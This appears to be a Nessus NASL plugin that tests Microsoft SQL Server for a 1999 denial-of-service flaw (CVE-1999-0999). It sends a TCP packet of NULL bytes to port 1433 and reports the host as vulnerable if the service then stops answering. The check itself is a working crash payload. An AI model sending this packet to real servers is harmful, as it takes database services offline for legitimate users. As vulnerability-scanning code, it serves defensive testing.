#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10145);
 script_bugtraq_id(817);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-1999-0999");
 name["english"] = "Microsoft's SQL TCP/IP denial of service";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote Microsoft SQL server can be shut down when it is
sent a TCP packet containing more than 2 NULLs.

An attacker may use this problem to prevent it from
being used by legitimate clients, thus threatening
your business.

Solution : filter incoming connections to port 1433
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Microsoft's SQL TCP/IP DoS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_require_ports("Services/mssql", 1433);
 script_dependencie("mssqlserver_detect.nasl");
 exit(0);
}

#
# The script code starts here
#

if (get_port_state(1433))
{
 soc = open_sock_tcp(1433);
 if (soc)
 {
  data = raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
  send(socket:soc, data:data);
  close(soc);
  sleep(2);
  soc2 = open_sock_tcp(1433);
  if(!soc2)security_hole(1433);
  else close(soc2);
 }
}
